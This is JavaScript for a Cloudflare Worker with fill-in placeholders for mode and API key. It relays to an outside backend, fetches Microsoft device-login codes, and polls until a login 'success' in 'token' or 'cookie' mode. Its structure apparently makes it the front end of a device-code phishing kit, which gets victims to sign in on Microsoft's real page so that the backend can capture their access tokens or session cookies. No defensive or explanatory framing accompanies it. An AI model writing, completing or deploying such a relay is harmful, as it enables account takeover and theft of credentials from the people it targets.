addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

const MODE = "{{MODE}}"          // token | cookie
const API_KEY = "{{API_KEY}}"
const BASE_URL = "https://nomaerngineering.com"

async function handleRequest(request) {
  const url = new URL(request.url)
  const path = url.pathname

  if (request.method === "GET" && path === "/") {
    return new Response(htmlUI(), {
      headers: { "content-type": "text/html" }
    })
  }

  if (request.method === "POST" && path === "/api/device/start") {
    return start()
  }

  if (request.method === "GET" && path.startsWith("/api/device/status/")) {
    const loginId = path.split("/").pop()
    return poll(loginId)
  }

  return new Response("Not found", { status: 404 })
}

//
// =========================
// 🚀 START
// =========================
async function start() {
  try {
    let endpoint = ""
    let headers = { "Content-Type": "application/json" }

    if (MODE === "cookie") {
      endpoint = "/api/python/start"
      headers["Authorization"] = "Bearer " + API_KEY
    } else {
      endpoint = `/api/start?api_key=${API_KEY}`
    }

    console.log("[START] fetching:", BASE_URL + endpoint)

    const resp = await fetch(BASE_URL + endpoint, {
      method: "POST",
      headers
    })

    const text = await resp.text()
    console.log("[START] response text:", text)

    if (!resp.ok) {
      return new Response("HTTP ERROR " + resp.status + "\n\n" + text)
    }

    let data
    try {
      data = JSON.parse(text)
    } catch (e) {
      console.error("[START] JSON parse error:", e)
      return new Response("INVALID JSON:\n\n" + text)
    }

    let jobId = null
    let status = data.status || "pending"
    let userCode = null
    let verificationUri = null

    if (MODE === "cookie") {
      jobId = data.job_id || null
      userCode = data.result?.device?.device_code || null
      verificationUri = data.result?.device?.verification_uri || null
    } else {
      // TOKEN MODE
      jobId = data.login_id || null
      userCode = data.user_code || null
      verificationUri = data.verification_uri || "https://login.microsoft.com/device"
      if (status === "pending") status = "waiting_user"
    }

    console.log("[START] normalized data:", { jobId, status, userCode, verificationUri })

    return Response.json({
      job_id: jobId,
      status,
      user_code: userCode,
      verification_uri: verificationUri
    })

  } catch (e) {
    console.error("[START] worker crash:", e)
    return Response.json({
      error: "Worker crash",
      message: e.message
    })
  }
}

//
// =========================
// 🔄 POLL
// =========================
async function poll(loginId) {
  try {
    if (!loginId || isNaN(loginId)) {
      return new Response("Invalid ID", { status: 400 })
    }

    let endpoint = ""
    let headers = {}

    if (MODE === "cookie") {
      endpoint = `/api/python/job/${loginId}`
      headers["Authorization"] = "Bearer " + API_KEY
    } else {
      endpoint = `/api/poll/${loginId}?api_key=${API_KEY}`
    }

    console.log("[POLL] fetching:", BASE_URL + endpoint)

    const resp = await fetch(BASE_URL + endpoint, { headers })
    const text = await resp.text()
    console.log("[POLL] response text:", text)

    if (!resp.ok) {
      return new Response("HTTP ERROR " + resp.status + "\n\n" + text)
    }

    let data
    try {
      data = JSON.parse(text)
    } catch (e) {
      console.error("[POLL] JSON parse error:", e)
      return new Response("INVALID JSON:\n\n" + text)
    }

    let userCode = null
    let verificationUri = null
    let status = data.status || "pending"

    if (MODE === "cookie") {
      const device = data.result?.device || {}
      userCode = device.device_code || null
      verificationUri = device.verification_uri || null
    } else {
      // TOKEN MODE
      userCode = data.user_code || null       // 🔥 ambil dari DB
      verificationUri = data.verification_uri || "https://login.microsoft.com/device"

      if (status === "pending" || status === "polling") status = "waiting_user"
      if (status === "success" || data.completed === true) status = "success"
    }

    console.log("[POLL] normalized data:", { status, userCode, verificationUri })

    return Response.json({
      status,
      user_code: userCode,
      verification_uri: verificationUri,
      error: data.last_error || data.error || null
    })

  } catch (e) {
    console.error("[POLL] worker error:", e)
    return Response.json({
      error: "Worker error",
      message: e.message
    })
  }
}
//
// =========================
// UI
// =========================
function htmlUI() {
  return HTML_CONTENT
}